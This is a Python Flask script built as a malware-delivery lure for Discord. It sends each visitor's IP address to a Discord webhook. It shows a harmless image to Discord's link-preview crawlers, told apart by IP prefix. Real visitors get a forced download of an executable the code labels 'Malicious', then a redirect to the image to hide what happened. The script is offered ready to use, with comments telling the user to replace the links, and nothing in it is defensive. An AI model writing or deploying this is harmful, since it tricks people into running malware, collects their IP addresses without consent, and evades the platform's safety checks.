import requests, io
from flask import Flask, request, send_file
from discord_webhook import DiscordWebhook
 
# if rate_limit_retry is True then in the event that you are being rate 
# limited by Discord your webhook will automatically be sent once the 
# rate limit has been lifted
 
 
app = Flask(
__name__,
  template_folder='templates',
  static_folder='static'
)
@app.route('/', methods=['GET'])
def main():
  Image = 'https://cdn.discordapp.com/attachments/913238682746642494/952630617760202772/7c2b8e91195aa3f7d4dc7270a1a2bdc1.png' # Replace this with your image link
  Malicious = 'https://cdn.discordapp.com/attachments/913238682746642494/951678351943286876/moon.exe'# Replace this with your download link
  # This is to get the ip
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    ip = request.environ['REMOTE_ADDR']
  else:
    ip = request.environ['HTTP_X_FORWARDED_FOR']
    webhook = DiscordWebhook(url='webhookurl', rate_limit_retry=True,
                         content=f'@everyone Someone clicked the image {ip}')
  response = webhook.execute()
 
  if ip.startswith('35.') or ip.startswith('34.'):
    # If discord is getting a link preview send a image
    return send_file(
    io.BytesIO(requests.get(Image).content),
    mimetype='image/jpeg',
    attachment_filename='s.png')
  else:
    # If a real person is clicking the link send a malicious file and redirect back to the image
    return f'''<meta http-equiv="refresh" content="0; url={Malicious}">
               '''+'''
          <script>setTimeout(function() {
            ''' + f'window.location = "{Image}"''''
          }, 500)</script>''' # If the file doesn't download change the 500 to a higher number like 1000
if __name__ == '__main__':
  # Run the Flask app
  app.run(
  host='0.0.0.0',
  debug=True,
  port=8080
  )
